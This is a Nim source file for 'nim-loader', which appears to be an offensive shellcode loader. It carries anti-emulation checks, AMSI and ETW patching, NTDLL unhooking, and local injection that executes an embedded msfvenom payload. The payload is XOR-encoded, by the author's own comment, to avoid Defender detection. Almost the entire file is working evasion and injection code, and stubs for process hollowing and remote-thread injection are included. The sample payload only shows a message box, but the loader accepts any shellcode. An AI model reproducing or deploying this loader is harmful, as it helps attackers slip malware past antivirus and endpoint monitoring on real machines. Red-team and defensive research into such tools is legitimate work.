#[
    nim-loader (v1.0.0)
    By Adam Svoboda (@adamsvoboda)

    References & Inspiration:
        - OffensiveNim by Marcello Salvati (@byt3bl33d3r)
        - NimlineWhispers2 by Alfie Champion (@ajpc500)
        - SysWhispers3 by klezVirus (@KlezVirus)
        - NimPackt-v1 by Cas van Cooten (@chvancooten)
        - unhook_bof.c by Mr. Un1k0d3r (@MrUn1k0d3r)
        - NimGetSyscallStub by S3cur3Th1sSh1t (@ShitSecure)
        - NimHollow by snovvcrash (@snovvcrash)
]#

import winim/lean

# Syscalls
import syscalls/GetSyscallStub

# Evasion Techniques
import evasion/patchAMSI
import evasion/patchETW
import evasion/unhookNTDLL
import evasion/antiEmulation

# Shellcode Injection Techniques
import injection/createRemoteThread
import injection/processHollowing

#[
proc decryptShellcode: =
    func toByteSeq*(str: string): seq[byte] {.inline.} =
        @(str.toOpenArrayByte(0, str.high))

    let
        password: string = ""
        ivB64: string = ""
        encB64: string = ""
    var
        ctx: CTR[aes256]
        key: array[aes256.sizeKey, byte]
        iv: seq[byte] = toByteSeq(decode(ivB64))
        enc: seq[byte] = toByteSeq(decode(encB64))
        dec: seq[byte] = newSeq[byte](len(enc))


    # KDF based on SHA256
    var expKey = sha256.digest(password)
    copyMem(addr key[0], addr expKey.data[0], len(expKey.data))
    ctx.init(key, iv)


    # Decrypt the shellcode
    ctx.decrypt(enc, dec)
    ctx.clear()
    hollowShellcode(dec)
]#

when isMainModule:

    echo """
+-----------------------------------------------------------------------------------------------+
|                                              nim-loader                                       |
+-----------------------------------------------------------------------------------------------+
    """
    # -----------------------------------------------------------------------------------------------
    # ANTI-SANDBOX / EMULATOR CHECKS
    # -----------------------------------------------------------------------------------------------
    echo "[antiEmulation] Stand-by for anti-emulation checks to pass..."
    if not sleepAndCheck():
        echo "    [X] Sleep did not pass the check, exiting"
        quit()
    if isEmulated():
        echo "    [X] VirtualAllocExNuma did not pass the check, exiting"
        quit()
    echo "[antiEmulation] Passed!"
    # -----------------------------------------------------------------------------------------------
    # API PATCHES AND EVASION
    # -----------------------------------------------------------------------------------------------
    var amsiPatched = patchAMSI()
    echo "[patchAMSI] AMSI disabled: ", amsiPatched

    var etwPatched = patchETW()
    echo "[patchETW] ETW disabled: ", etwPatched

    # -----------------------------------------------------------------------------------------------
    # NTDLL RELOADING / UNHOOKING
    # -----------------------------------------------------------------------------------------------
    var unhookedNTDLL = unhookNTDLL()
    echo "[unhookNTDLL] NTDLL Unhooked: ", bool(unhookedNTDLL)

    # -----------------------------------------------------------------------------------------------
    # DECRYPT AND INJECT SHELLCODE
    # -----------------------------------------------------------------------------------------------
    when defined(windows):
        when defined(i386):
            echo "    [X] 32bit is not supported."
            return 

        elif defined(amd64):
            # Using xor_dynamic encoder to stop Defender from detecting Metasploit shellcode, since we aren't 
            # implementing any sort of shellcode encryption yet!

            # msfvenom -p windows/x64/messagebox -e x64/xor_dynamic TITLE='THE GIBSON' TEXT='Hack the Planet!' EXITFUNC=thread -f csharp
            const shellcode_length: int = 373
            var shellcode: array[shellcode_length, byte] = [
            byte 0xeb,0x27,0x5b,0x53,0x5f,0xb0,0x75,0xfc,0xae,0x75,0xfd,0x57,0x59,0x53,0x5e,
            0x8a,0x06,0x30,0x07,0x48,0xff,0xc7,0x48,0xff,0xc6,0x66,0x81,0x3f,0x82,0x54,
            0x74,0x07,0x80,0x3e,0x75,0x75,0xea,0xeb,0xe6,0xff,0xe1,0xe8,0xd4,0xff,0xff,
            0xff,0x14,0x75,0xe8,0x5c,0x95,0xf0,0xe4,0xeb,0xeb,0xeb,0xfc,0xc4,0x14,0x14,
            0x14,0x55,0x45,0x55,0x44,0x46,0x45,0x42,0x5c,0x25,0xc6,0x71,0x5c,0x9f,0x46,
            0x74,0x2a,0x5c,0x9f,0x46,0x0c,0x2a,0x5c,0x9f,0x46,0x34,0x2a,0x5c,0x9f,0x66,
            0x44,0x2a,0x5c,0x1b,0xa3,0x5e,0x5e,0x59,0x25,0xdd,0x5c,0x25,0xd4,0xb8,0x28,
            0x75,0x68,0x16,0x38,0x34,0x55,0xd5,0xdd,0x19,0x55,0x15,0xd5,0xf6,0xf9,0x46,
            0x55,0x45,0x2a,0x5c,0x9f,0x46,0x34,0x2a,0x9f,0x56,0x28,0x5c,0x15,0xc4,0x2a,
            0x9f,0x94,0x9c,0x14,0x14,0x14,0x5c,0x91,0xd4,0x60,0x7b,0x5c,0x15,0xc4,0x44,
            0x2a,0x9f,0x5c,0x0c,0x2a,0x50,0x9f,0x54,0x34,0x5d,0x15,0xc4,0xf7,0x48,0x5c,
            0xeb,0xdd,0x2a,0x55,0x9f,0x20,0x9c,0x5c,0x15,0xc2,0x59,0x25,0xdd,0x5c,0x25,
            0xd4,0xb8,0x55,0xd5,0xdd,0x19,0x55,0x15,0xd5,0x2c,0xf4,0x61,0xe5,0x2a,0x58,
            0x17,0x58,0x30,0x1c,0x51,0x2d,0xc5,0x61,0xc2,0x4c,0x2a,0x50,0x9f,0x54,0x30,
            0x5d,0x15,0xc4,0x72,0x2a,0x55,0x9f,0x18,0x5c,0x2a,0x50,0x9f,0x54,0x08,0x5d,
            0x15,0xc4,0x2a,0x55,0x9f,0x10,0x9c,0x5c,0x15,0xc4,0x55,0x4c,0x55,0x4c,0x4a,
            0x4d,0x4e,0x55,0x4c,0x55,0x4d,0x55,0x4e,0x5c,0x97,0xf8,0x34,0x55,0x46,0xeb,
            0xf4,0x4c,0x55,0x4d,0x4e,0x2a,0x5c,0x9f,0x06,0xfd,0x5d,0xeb,0xeb,0xeb,0x49,
            0x5d,0xd3,0xd5,0x14,0x14,0x14,0x14,0x2a,0x5c,0x99,0x81,0x0e,0x15,0x14,0x14,
            0x2a,0x58,0x99,0x91,0x3f,0x15,0x14,0x14,0x5c,0x25,0xdd,0x55,0xae,0x51,0x97,
            0x42,0x13,0xeb,0xc1,0xaf,0xf4,0x09,0x3e,0x1e,0x55,0xae,0xb2,0x81,0xa9,0x89,
            0xeb,0xc1,0x5c,0x97,0xd0,0x3c,0x28,0x12,0x68,0x1e,0x94,0xef,0xf4,0x61,0x11,
            0xaf,0x53,0x07,0x66,0x7b,0x7e,0x14,0x4d,0x55,0x9d,0xce,0xeb,0xc1,0x5c,0x75,
            0x77,0x7f,0x34,0x60,0x7c,0x71,0x34,0x44,0x78,0x75,0x7a,0x71,0x60,0x35,0x14,
            0x40,0x5c,0x51,0x34,0x53,0x5d,0x56,0x47,0x5b,0x5a,0x14,0x82,0x54]

            # -----------------------------------------------------------------------------------------------
            # INJECTION
            # -----------------------------------------------------------------------------------------------

            # Local Injection
            # Source: https://github.com/byt3bl33d3r/OffensiveNim/pull/29/commits/5b1eeccca6a2bc5fd26a8e893a01656f0c7c9ade
            let tProcess = GetCurrentProcessId()
            var pHandle: HANDLE = OpenProcess(PROCESS_ALL_ACCESS, FALSE, tProcess)

            var shellcodePtr: ptr = (cast[ptr array[shellcode_length, byte]](addr shellcode[0]))

            echo "[localInject] Local PID: ", tProcess
            echo "[localInject] Allocating ", shellcode_length, " bytes of memory as RWX..."

            let rPtr = VirtualAllocEx(
                pHandle,
                NULL,
                cast[SIZE_T](shellcode_length),
                MEM_COMMIT,
                PAGE_EXECUTE_READ_WRITE
            )

            echo "[localInject]: Copying shellcode to newly allocated memory..."
            copyMem(rPtr, shellcodePtr, shellcode_length)

            echo "[localInject]: Executing shellcode..."
            let f = cast[proc(){.nimcall.}](rPtr)
            f()

            # VirtualAlloc
            # RtlMoveMemory
            # VirtualProtect
            # CreateThread

            # CreateRemoteThread Example
            # injectCreateRemoteThread(shellcode)
            
            # Process Hollowing Example
            # injectProcessHollowing(shellcode)

            # RunPE Example
            # import injection/runPE
